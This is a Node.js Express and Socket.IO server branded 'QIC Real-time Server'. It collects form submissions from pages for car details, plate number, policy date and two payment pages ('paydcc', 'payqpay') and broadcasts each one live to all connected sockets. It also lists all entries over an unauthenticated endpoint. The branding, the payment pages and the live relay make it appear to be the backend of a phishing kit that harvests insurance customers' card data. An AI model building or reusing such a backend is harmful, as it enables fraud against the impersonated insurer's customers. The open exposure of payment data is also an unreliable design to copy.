// backend/server.js - Real-time Backend with MongoDB Change Streams + In-Memory Fallback
require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const bodyParser = require('body-parser');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const mongoose = require('mongoose');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: process.env.FRONTEND_ORIGIN || 'http://localhost:3002' }
});

app.use(cors({ origin: process.env.FRONTEND_ORIGIN || 'http://localhost:3002', credentials: true }));
app.use(bodyParser.json());

const submitLimiter = rateLimit({ 
  windowMs: 60 * 1000, 
  max: 20, 
  message: { success: false, error: 'Too many requests' } 
});

// ===================== MongoDB Configuration =====================

const MONGODB_URI = process.env.MONGODB_URI || '';
let mongoConnected = false;

// Map sourcePage -> socket event name
const PAGE_EVENT_MAP = {
  '/car-details': 'newCarDetails',
  '/more-details': 'newMoreDetails',
  '/quote': 'newSelectInsurance',
  '/select-insurance': 'newSelectInsurance',
  '/plate-number': 'newPlateNumber',
  '/policy-date': 'newPolicyDate',
  '/quotecheaK': 'newQuote',
  '/paydcc': 'newPayment',
  '/payqpay': 'newPayment',
  '/info-insurance': 'newInsuranceInfo'
};

// Only attempt MongoDB connection if URI is provided
if (MONGODB_URI) {
  mongoose.connect(MONGODB_URI, {
    maxPoolSize: parseInt(process.env.MONGO_MAX_POOL_SIZE || '10', 10),
    minPoolSize: parseInt(process.env.MONGO_MIN_POOL_SIZE || '1', 10),
    serverSelectionTimeoutMS: parseInt(process.env.MONGO_SERVER_SELECTION_TIMEOUT || '5000', 10),
    socketTimeoutMS: parseInt(process.env.MONGO_SOCKET_TIMEOUT || '45000', 10),
    family: 4
  })
  .then(() => {
    console.log('✅ MongoDB connected successfully');
    console.log(`📊 Database: ${mongoose.connection.db.databaseName}`);
    mongoConnected = true;
    initChangeStream();
  })
  .catch(err => {
    console.error('❌ MongoDB connection error:', err.message);
    console.log('⚠️  Falling back to in-memory storage');
    mongoConnected = false;
  });

  // Connection event handlers
  mongoose.connection.on('connected', () => {
    console.log('✅ MongoDB connection established');
    mongoConnected = true;
  });

  mongoose.connection.on('disconnected', () => {
    console.log('⚠️  MongoDB connection lost');
    mongoConnected = false;
  });

  mongoose.connection.on('error', (err) => {
    console.error('❌ MongoDB error:', err.message);
    mongoConnected = false;
  });
} else {
  console.log('\n📝 MONGODB_URI not configured');
  console.log('✅ Using IN-MEMORY storage (development mode)');
  console.log('💡 To enable MongoDB, set MONGODB_URI in .env file\n');
}

// ===================== Mongoose Schema & Model =====================

const entrySchema = new mongoose.Schema({
  sourcePage: { type: String, required: true },
  payload: { type: mongoose.Schema.Types.Mixed, default: {} },
  submittedAt: { type: Date, default: () => new Date() }
}, { strict: false });

const Entry = mongoose.models.Entry || mongoose.model('Entry', entrySchema);

// ===================== In-Memory Storage (Fallback) =====================

let entries = [];

// ===================== MongoDB Change Stream =====================

function initChangeStream() {
  try {
    const changeStream = Entry.watch([{ $match: { operationType: 'insert' } }], { 
      fullDocument: 'updateLookup' 
    });
    
    changeStream.on('change', change => {
      if (!change.fullDocument) return;
      const doc = change.fullDocument;
      const eventName = PAGE_EVENT_MAP[doc.sourcePage] || 'newEntry';
      
      io.emit(eventName, {
        id: doc._id,
        sourcePage: doc.sourcePage,
        payload: doc.payload,
        submittedAt: doc.submittedAt
      });
      
      console.log(`📡 ChangeStream: Emitted ${eventName} for ${doc.sourcePage}`);
    });
    
    changeStream.on('error', err => {
      console.error('❌ ChangeStream error:', err.message);
    });
    
    console.log('🔁 MongoDB ChangeStream initialized');
  } catch (err) {
    console.error('⚠️  Failed to init ChangeStream (not supported on this deployment):', err.message);
    console.log('💡 Tip: ChangeStreams require replica set (MongoDB Atlas supports this)');
  }
}

// ===================== Socket.IO =====================

io.on('connection', (socket) => {
  console.log(`✅ Socket connected: ${socket.id}`);
  
  // Send initial data (last 200 entries)
  (async () => {
    try {
      if (mongoConnected) {
        const docs = await Entry.find({}).sort({ submittedAt: -1 }).limit(200).lean();
        socket.emit('initialData', docs);
        console.log(`📤 Sent ${docs.length} entries from MongoDB to ${socket.id}`);
      } else {
        socket.emit('initialData', entries.slice().reverse());
        console.log(`📤 Sent ${entries.length} entries from memory to ${socket.id}`);
      }
    } catch (err) {
      console.error('❌ Error fetching initial data:', err);
      socket.emit('initialData', entries.slice().reverse());
    }
  })();
  
  socket.on('disconnect', () => {
    console.log(`❌ Socket disconnected: ${socket.id}`);
  });
});

// ===================== REST API Endpoints =====================

// POST /api/submit - Submit data from any customer page
app.post('/api/submit', submitLimiter, async (req, res) => {
  try {
    const { sourcePage, payload } = req.body || {};
    
    if (!sourcePage || typeof payload !== 'object') {
      return res.status(400).json({ 
        success: false, 
        error: 'sourcePage and payload required' 
      });
    }

    const entryObj = {
      sourcePage,
      payload,
      submittedAt: new Date()
    };

    if (mongoConnected) {
      // Save to MongoDB
      const saved = await Entry.create(entryObj);
      // ChangeStream will broadcast automatically
      console.log(`✅ Saved to MongoDB: ${saved._id} from ${sourcePage}`);
      
      return res.status(201).json({ 
        success: true, 
        message: 'تم حفظ البيانات بنجاح', 
        data: { 
          id: saved._id, 
          sourcePage: saved.sourcePage, 
          payload: saved.payload, 
          submittedAt: saved.submittedAt 
        } 
      });
    } else {
      // Fallback: in-memory
      const id = Date.now() + Math.floor(Math.random() * 1000);
      const entry = { id, ...entryObj };
      entries.push(entry);
      
      const eventName = PAGE_EVENT_MAP[sourcePage] || 'newEntry';
      io.emit(eventName, entry);
      console.log(`✅ Saved to memory: ${id} from ${sourcePage}`);
      
      return res.status(201).json({ 
        success: true, 
        message: 'تم حفظ البيانات بنجاح (in-memory)', 
        data: entry, 
        sourcePage 
      });
    }
  } catch (err) {
    console.error('❌ Submit error:', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

// GET /api/entries - Get all entries (with optional filters)
app.get('/api/entries', async (req, res) => {
  const page = req.query.page;
  const limit = Math.min(parseInt(req.query.limit || '200', 10), 1000);
  
  try {
    if (mongoConnected) {
      const query = page ? { sourcePage: page } : {};
      const docs = await Entry.find(query).sort({ submittedAt: -1 }).limit(limit).lean();
      return res.json({ success: true, count: docs.length, entries: docs });
    } else {
      let out = entries.slice().reverse();
      if (page) out = out.filter(e => e.sourcePage === page);
      out = out.slice(0, limit);
      return res.json({ success: true, count: out.length, entries: out });
    }
  } catch (err) {
    console.error('❌ GET /api/entries error:', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

// GET /health - Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    mongodb: mongoConnected ? 'connected' : 'using-in-memory',
    storage: mongoConnected ? 'MongoDB' : 'In-Memory',
    uptime: process.uptime()
  });
});

// GET /api/db-status - Detailed database status
app.get('/api/db-status', (req, res) => {
  res.json({
    mongodb: {
      connected: mongoConnected,
      state: mongoose.connection.readyState,
      database: mongoConnected ? mongoose.connection.db?.databaseName : null
    },
    storage: {
      type: mongoConnected ? 'MongoDB' : 'In-Memory',
      inMemoryRecords: mongoConnected ? null : {
        entries: entries.length
      }
    },
    message: mongoConnected 
      ? 'Connected to MongoDB - data is persistent' 
      : 'Using in-memory storage (data will be lost on restart)'
  });
});

// ===================== Server Startup =====================

const PORT = process.env.PORT || 4001;

server.listen(PORT, () => {
  const dbStatus = mongoConnected ? '✅ MongoDB' : '⚠️  In-Memory';
  
  console.log(`
╔═══════════════════════════════════════╗
║  🚀 QIC Real-time Server Running      ║
║  📡 Port: ${PORT}                        ║
║  🗄️  Database: ${dbStatus}              ║
${!mongoConnected ? '║  ⚠️  Data will be lost on restart   ║' : '║  ✅ Data is persistent              ║'}
╚═══════════════════════════════════════╝

🔗 Endpoints:
   - Health Check: http://localhost:${PORT}/health
   - DB Status:    http://localhost:${PORT}/api/db-status
   - Submit Data:  http://localhost:${PORT}/api/submit
   - Get Entries:  http://localhost:${PORT}/api/entries

${!mongoConnected ? '💡 To enable MongoDB persistence, set MONGODB_URI in .env file' : ''}
  `);
});
